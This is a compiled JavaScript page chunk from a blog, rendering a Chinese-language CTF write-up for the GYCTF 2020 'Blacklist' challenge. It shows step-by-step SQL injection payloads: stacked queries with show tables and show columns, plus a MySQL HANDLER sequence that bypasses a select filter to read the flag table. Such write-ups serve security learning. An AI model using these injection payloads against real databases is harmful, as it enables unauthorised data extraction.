(window.webpackJsonp=window.webpackJsonp||[]).push([[11],{335:function(a,t,s){"use strict";s.r(t);var e=s(4),l=Object(e.a)({},(function(){var a=this,t=a._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[t("h1",{attrs:{id:"gyctf-2020-blacklist"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#gyctf-2020-blacklist"}},[a._v("#")]),a._v(" GYCTF 2020 Blacklist")]),a._v(" "),t("h2",{attrs:{id:"题目分析"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#题目分析"}},[a._v("#")]),a._v(" 题目分析")]),a._v(" "),t("p",[a._v("首先看一下题目，很普通的一个查询页面：")]),a._v(" "),t("p",[t("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/GYCTF_2020_Blacklist1.png",alt:"GYCTF_2020_Blacklist1"}})]),a._v(" "),t("p",[a._v("输入2a后返回以下页面，测试后是单引号字符型注入")]),a._v(" "),t("p",[t("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/GYCTF_2020_Blacklist2.png",alt:"GYCTF_2020_Blacklist2"}})]),a._v(" "),t("p",[a._v("常规猜字段，字段数为2")]),a._v(" "),t("p",[t("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/GYCTF_2020_Blacklist3.png",alt:"GYCTF_2020_Blacklist3"}})]),a._v(" "),t("p",[a._v("尝试联合注入"),t("code",[a._v("1' union select 1,2#")]),a._v(",提示被过滤了")]),a._v(" "),t("p",[t("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/GYCTF_2020_Blacklist4.png",alt:"GYCTF_2020_Blacklist4"}})]),a._v(" "),t("p",[a._v("后续尝试报错注入，但过滤了很多东西，没试出结果，不过测试出了show可用，并且堆叠注入也可用")]),a._v(" "),t("p",[t("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/GYCTF_2020_Blacklist5.png",alt:"GYCTF_2020_Blacklist5"}})]),a._v(" "),t("p",[a._v("查表"),t("code",[a._v("1';show tables;")])]),a._v(" "),t("p",[t("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/GYCTF_2020_Blacklist6.png",alt:"GYCTF_2020_Blacklist6"}})]),a._v(" "),t("p",[a._v("查FlagHere表中的列"),t("code",[a._v("1';show columns from FlagHere;")])]),a._v(" "),t("p",[t("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/GYCTF_2020_Blacklist7.png",alt:"GYCTF_2020_Blacklist7"}})]),a._v(" "),t("h2",{attrs:{id:"思路整理"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#思路整理"}},[a._v("#")]),a._v(" 思路整理")]),a._v(" "),t("ul",[t("li",[a._v("select关键字被过滤了无法使用")]),a._v(" "),t("li",[a._v("flag所在的表名、列名已知")]),a._v(" "),t("li",[a._v("需要用其他函数或办法代替select查询出数据")])]),a._v(" "),t("h2",{attrs:{id:"handler语法"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#handler语法"}},[a._v("#")]),a._v(" Handler语法")]),a._v(" "),t("h3",{attrs:{id:"背景"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#背景"}},[a._v("#")]),a._v(" 背景")]),a._v(" "),t("ul",[t("li",[a._v("handler语句，一行一行的浏览一个表中的数据")]),a._v(" "),t("li",[a._v("handler语句并不具备select语句的所有功能。")]),a._v(" "),t("li",[a._v("mysql专用的语句，并没有包含到SQL标准中。")]),a._v(" "),t("li",[a._v("handler语句提供通往表的直接通道的存储引擎接口，可以用于MyISAM和InnoDB表。")])]),a._v(" "),t("h3",{attrs:{id:"语法"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#语法"}},[a._v("#")]),a._v(" 语法")]),a._v(" "),t("div",{staticClass:"language-mysql line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[a._v("HANDLER table_name OPEN //打开一张表，无返回结果，实际上这里声明了一个名为table_nam的句柄\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br")])]),t("div",{staticClass:"language-mysql line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[a._v("HANDLER table_name READ FIRST //获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br")])]),t("div",{staticClass:"language-mysql line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[a._v("HANDLER table_name CLOSE //关闭打开的句柄\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br")])]),t("div",{staticClass:"language-mysql line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[a._v("HANDLER table_name READ index_name = value //通过索引列指定一个值，可以指定从哪一行开始,通过NEXT继续浏览\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br")])]),t("h2",{attrs:{id:"payload"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#payload"}},[a._v("#")]),a._v(" Payload")]),a._v(" "),t("p",[a._v("回到本题，所以构造Payload如下：")]),a._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[a._v("1';handler FlagHere open;handler FlagHere read first;handler FlagHere close;\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br")])]),t("p",[a._v("即可获得flag")]),a._v(" "),t("p",[t("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/GYCTF_2020_Blacklist8.png",alt:"GYCTF_2020_Blacklist8"}})])])}),[],!1,null,null,null);t.default=l.exports}}]);